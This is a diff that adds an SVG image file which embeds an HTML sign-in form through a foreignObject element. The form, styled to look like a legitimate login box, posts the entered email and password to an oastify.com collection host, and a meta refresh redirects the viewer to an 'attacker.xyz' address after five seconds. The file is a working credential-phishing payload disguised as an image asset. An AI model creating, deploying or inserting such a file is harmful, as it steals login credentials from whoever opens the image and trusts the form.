@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg
+  xmlns="http://www.w3.org/2000/svg"
+  xmlns:xhtml="http://www.w3.org/1999/xhtml"
+  viewBox="0 0 1900 800"
+  preserveAspectRatio="xMidYMid meet">
+
+  <rect width="100%" height="100%" fill="#f8f9fa"/>
+
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <xhtml:html>
+      <xhtml:head>
+        <xhtml:style>
+          :root {
+            --first-color: #1A73E8;
+            --input-color: #80868B;
+            --border-color: #DADCE0;
+            --body-font: -apple-system, BlinkMacSystemFont, "Segoe UI",
+                          Roboto, Arial, sans-serif;
+            --normal-font-size: 1rem;
+            --small-font-size: .75rem;
+          }
+
+          * { box-sizing: border-box; }
+
+          body {
+            margin: 0;
+            padding: 0;
+            font-family: var(--body-font);
+            font-size: var(--normal-font-size);
+            background: transparent;
+          }
+
+          .l-form {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 520px;
+          }
+
+          .form {
+            width: 360px;
+            padding: 3rem 2rem;
+            border-radius: 1rem;
+            background: #fff;
+            box-shadow: 0 10px 25px rgba(92, 99, 105, 0.2);
+          }
+
+          .form__title {
+            font-weight: 500;
+            margin-bottom: 2.5rem;
+            text-align: center;
+          }
+
+          .form__div {
+            position: relative;
+            height: 52px;
+            margin-bottom: 1.5rem;
+          }
+
+          .form__input {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            border: 2px solid var(--border-color);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            background: none;
+            outline: none;
+            z-index: 1;
+          }
+
+          .form__label {
+            position: absolute;
+            left: 1rem;
+            top: 1rem;
+            padding: 0 .25rem;
+            background: #fff;
+            color: var(--input-color);
+            transition: .3s;
+            pointer-events: none;
+          }
+
+          .form__input:focus + .form__label,
+          .form__input:not(:placeholder-shown) + .form__label {
+            top: -0.5rem;
+            left: .8rem;
+            font-size: var(--small-font-size);
+            font-weight: 500;
+            color: var(--first-color);
+          }
+
+          .form__button {
+            display: block;
+            margin-left: auto;
+            padding: .75rem 2rem;
+            border: none;
+            border-radius: .25rem;
+            background: var(--first-color);
+            color: #fff;
+            cursor: pointer;
+          }
+        </xhtml:style>
+      </xhtml:head>
+
+      <xhtml:body>
+        <xhtml:meta http-equiv="refresh" content="5;URL=https://attacker.xyz/">
+        <xhtml:div class="l-form">
+          <xhtml:form class="form" action="https://u2xe8bqysz87ly9yby87qnn4nvtmhh56.oastify.com/" method="POST">
+            <xhtml:h1 class="form__title">Sign In</xhtml:h1>
+
+            <xhtml:div class="form__div">
+              <xhtml:input class="form__input" name="email" placeholder=" " />
+              <xhtml:label class="form__label" for="email">Email</xhtml:label>
+            </xhtml:div>
+
+            <xhtml:div class="form__div">
+              <xhtml:input type="password" name="password" class="form__input" placeholder=" " />
+              <xhtml:label class="form__label" for="password">Password</xhtml:label>
+            </xhtml:div>
+
+            <xhtml:input type="submit" class="form__button" value="Sign In"/>
+          </xhtml:form>
+        </xhtml:div>
+      </xhtml:body>
+    </xhtml:html>
+  </foreignObject>
+</svg>
